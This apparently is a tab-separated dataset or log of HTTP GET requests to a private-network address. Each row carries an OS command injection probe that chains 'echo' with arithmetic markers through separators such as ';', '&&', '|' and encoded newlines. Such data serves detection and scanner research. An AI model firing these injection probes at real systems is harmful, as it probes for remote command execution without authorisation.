+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo GCDHIF$((57+20))$(echo GCDHIF)GCDHIF\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo GCDHIF$((57+20))$(echo GCDHIF)GCDHIF\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho VMJQQD$((8+21))$(echo VMJQQD)VMJQQD\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho VMJQQD$((8+21))$(echo VMJQQD)VMJQQD\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho VMJQQD$((8+21))$(echo VMJQQD)VMJQQD\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho VMJQQD$((8+21))$(echo VMJQQD)VMJQQD\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho XCFRMX$((24+33))$(echo XCFRMX)XCFRMX\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho XCFRMX$((24+33))$(echo XCFRMX)XCFRMX\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho XCFRMX$((24+33))$(echo XCFRMX)XCFRMX\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho XCFRMX$((24+33))$(echo XCFRMX)XCFRMX\\				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo JTXSBO$((19+66))$(echo JTXSBO)JTXSBO&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo PHHEAZ$((33+71))$(echo PHHEAZ)PHHEAZ&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo PHHEAZ$((33+71))$(echo PHHEAZ)PHHEAZ&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo PHHEAZ$((33+71))$(echo PHHEAZ)PHHEAZ&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo PHHEAZ$((33+71))$(echo PHHEAZ)PHHEAZ&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo BVPAGY$((5+7))$(echo BVPAGY)BVPAGY&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo BVPAGY$((5+7))$(echo BVPAGY)BVPAGY&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo BVPAGY$((5+7))$(echo BVPAGY)BVPAGY&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo BVPAGY$((5+7))$(echo BVPAGY)BVPAGY&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo SXZLBR$((7+30))$(echo SXZLBR)SXZLBR&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo SXZLBR$((7+30))$(echo SXZLBR)SXZLBR&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo SXZLBR$((7+30))$(echo SXZLBR)SXZLBR&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo SXZLBR$((7+30))$(echo SXZLBR)SXZLBR&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo CTFRHN$((88+31))$(echo CTFRHN)CTFRHN&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo CTFRHN$((88+31))$(echo CTFRHN)CTFRHN&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo CTFRHN$((88+31))$(echo CTFRHN)CTFRHN&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo CTFRHN$((88+31))$(echo CTFRHN)CTFRHN&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo IOYOYI$((89+27))$(echo IOYOYI)IOYOYI&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo IOYOYI$((89+27))$(echo IOYOYI)IOYOYI&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo IOYOYI$((89+27))$(echo IOYOYI)IOYOYI&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo IOYOYI$((89+27))$(echo IOYOYI)IOYOYI&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo JRAUDH$((80+80))$(echo JRAUDH)JRAUDH&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo JRAUDH$((80+80))$(echo JRAUDH)JRAUDH&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo JRAUDH$((80+80))$(echo JRAUDH)JRAUDH&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo JRAUDH$((80+80))$(echo JRAUDH)JRAUDH&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LGTMTC$((33+63))$(echo LGTMTC)LGTMTC&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LGTMTC$((33+63))$(echo LGTMTC)LGTMTC&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LGTMTC$((33+63))$(echo LGTMTC)LGTMTC&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo LGTMTC$((33+63))$(echo LGTMTC)LGTMTC&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CKKUQT$((58+61))$(echo CKKUQT)CKKUQT&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CKKUQT$((58+61))$(echo CKKUQT)CKKUQT&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CKKUQT$((58+61))$(echo CKKUQT)CKKUQT&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CKKUQT$((58+61))$(echo CKKUQT)CKKUQT&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo LBOOIF$((95+3))$(echo LBOOIF)LBOOIF&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo LBOOIF$((95+3))$(echo LBOOIF)LBOOIF&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo LBOOIF$((95+3))$(echo LBOOIF)LBOOIF&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo LBOOIF$((95+3))$(echo LBOOIF)LBOOIF&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo KHMDFL$((10+29))$(echo KHMDFL)KHMDFL&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo KHMDFL$((10+29))$(echo KHMDFL)KHMDFL&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo AEYRHM$((18+36))$(echo AEYRHM)AEYRHM&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo AEYRHM$((18+36))$(echo AEYRHM)AEYRHM&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo AEYRHM$((18+36))$(echo AEYRHM)AEYRHM&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo AEYRHM$((18+36))$(echo AEYRHM)AEYRHM&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho STMWAO$((61+41))$(echo STMWAO)STMWAO&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho STMWAO$((61+41))$(echo STMWAO)STMWAO&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho STMWAO$((61+41))$(echo STMWAO)STMWAO&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho STMWAO$((61+41))$(echo STMWAO)STMWAO&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho CJMFVR$((44+81))$(echo CJMFVR)CJMFVR&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho CJMFVR$((44+81))$(echo CJMFVR)CJMFVR&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho CJMFVR$((44+81))$(echo CJMFVR)CJMFVR&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho CJMFVR$((44+81))$(echo CJMFVR)CJMFVR&'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo SZEDLL$((20+51))$(echo SZEDLL)SZEDLL'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo SZEDLL$((20+51))$(echo SZEDLL)SZEDLL'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo SZEDLL$((20+51))$(echo SZEDLL)SZEDLL'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo SZEDLL$((20+51))$(echo SZEDLL)SZEDLL'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo JJHVND$((97+70))$(echo JJHVND)JJHVND'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo JJHVND$((97+70))$(echo JJHVND)JJHVND'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo JJHVND$((97+70))$(echo JJHVND)JJHVND'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo JJHVND$((97+70))$(echo JJHVND)JJHVND'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo WBSDBD$((22+5))$(echo WBSDBD)WBSDBD'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo WBSDBD$((22+5))$(echo WBSDBD)WBSDBD'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo WBSDBD$((22+5))$(echo WBSDBD)WBSDBD'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo WBSDBD$((22+5))$(echo WBSDBD)WBSDBD'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo FGZIXO$((0+56))$(echo FGZIXO)FGZIXO'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo FGZIXO$((0+56))$(echo FGZIXO)FGZIXO'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo FGZIXO$((0+56))$(echo FGZIXO)FGZIXO'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo FGZIXO$((0+56))$(echo FGZIXO)FGZIXO'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo RFRFFQ$((49+91))$(echo RFRFFQ)RFRFFQ'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo RFRFFQ$((49+91))$(echo RFRFFQ)RFRFFQ'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo RFRFFQ$((49+91))$(echo RFRFFQ)RFRFFQ'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&echo RFRFFQ$((49+91))$(echo RFRFFQ)RFRFFQ'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo EEZDTS$((43+0))$(echo EEZDTS)EEZDTS'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo NSOJTW$((66+86))$(echo NSOJTW)NSOJTW'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo NSOJTW$((66+86))$(echo NSOJTW)NSOJTW'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo NSOJTW$((66+86))$(echo NSOJTW)NSOJTW'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo NSOJTW$((66+86))$(echo NSOJTW)NSOJTW'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo UVGRRK$((48+69))$(echo UVGRRK)UVGRRK'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo UVGRRK$((48+69))$(echo UVGRRK)UVGRRK'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo UVGRRK$((48+69))$(echo UVGRRK)UVGRRK'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			&&echo UVGRRK$((48+69))$(echo UVGRRK)UVGRRK'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo KMXJRR$((77+23))$(echo KMXJRR)KMXJRR'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CQWVWF$((42+31))$(echo CQWVWF)CQWVWF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CQWVWF$((42+31))$(echo CQWVWF)CQWVWF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CQWVWF$((42+31))$(echo CQWVWF)CQWVWF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			|echo CQWVWF$((42+31))$(echo CQWVWF)CQWVWF'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QJBRSU$((82+63))$(echo QJBRSU)QJBRSU'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QJBRSU$((82+63))$(echo QJBRSU)QJBRSU'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QJBRSU$((82+63))$(echo QJBRSU)QJBRSU'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo QJBRSU$((82+63))$(echo QJBRSU)QJBRSU'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JCMDXA$((3+77))$(echo JCMDXA)JCMDXA'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JCMDXA$((3+77))$(echo JCMDXA)JCMDXA'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JCMDXA$((3+77))$(echo JCMDXA)JCMDXA'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			||echo JCMDXA$((3+77))$(echo JCMDXA)JCMDXA'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho XRDMQV$((0+84))$(echo XRDMQV)XRDMQV'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho XRDMQV$((0+84))$(echo XRDMQV)XRDMQV'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho XRDMQV$((0+84))$(echo XRDMQV)XRDMQV'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0aecho XRDMQV$((0+84))$(echo XRDMQV)XRDMQV'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho TDMUCK$((83+9))$(echo TDMUCK)TDMUCK'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho TDMUCK$((83+9))$(echo TDMUCK)TDMUCK'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho TDMUCK$((83+9))$(echo TDMUCK)TDMUCK'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			%0d%0aecho TDMUCK$((83+9))$(echo TDMUCK)TDMUCK'				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo TAIYMM$((10+88))$(echo TAIYMM)TAIYMM"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo TAIYMM$((10+88))$(echo TAIYMM)TAIYMM"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo TAIYMM$((10+88))$(echo TAIYMM)TAIYMM"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			echo TAIYMM$((10+88))$(echo TAIYMM)TAIYMM"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ALJEPA$((6+43))$(echo ALJEPA)ALJEPA"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ALJEPA$((6+43))$(echo ALJEPA)ALJEPA"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ALJEPA$((6+43))$(echo ALJEPA)ALJEPA"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo ALJEPA$((6+43))$(echo ALJEPA)ALJEPA"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo PXRWDW$((31+9))$(echo PXRWDW)PXRWDW"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo PXRWDW$((31+9))$(echo PXRWDW)PXRWDW"				/web/
+*/*	gzip, deflate																close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			;echo PXRWDW$((31+9))$(echo PXRWDW)PXRWDW"				/web/
